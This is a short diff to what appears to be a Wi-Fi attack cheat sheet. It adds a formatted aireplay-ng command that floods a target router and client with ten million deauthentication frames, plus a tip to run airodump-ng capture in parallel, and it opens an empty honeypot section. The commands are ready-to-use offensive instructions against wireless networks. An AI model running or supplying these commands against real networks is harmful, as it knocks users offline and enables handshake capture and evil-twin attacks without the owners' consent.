@@ -24,4 +24,10 @@ airodump-ng --bssid <bssid> --channel <channel_num> --write <filename> wlan0
 
 ## Deauthentication Attack
 
+Ensure the `airodump-ng` command is running in a parallel terminal for this to work effectively
+```
 aireplay-ng --deauth 10000000 -a <router-bssid> -c <station-bssid> wlan0
+```
+
+## Setting up honeypot
+
